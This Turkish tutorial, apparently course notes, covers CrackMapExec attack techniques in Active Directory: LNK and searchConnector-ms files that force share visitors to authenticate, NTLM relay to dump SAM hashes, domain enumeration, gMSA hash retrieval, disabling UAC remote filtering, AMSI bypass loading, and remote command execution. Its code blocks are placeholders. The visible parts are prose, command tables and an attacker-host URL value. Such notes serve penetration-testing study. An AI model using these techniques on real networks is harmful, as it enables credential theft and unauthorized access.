LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

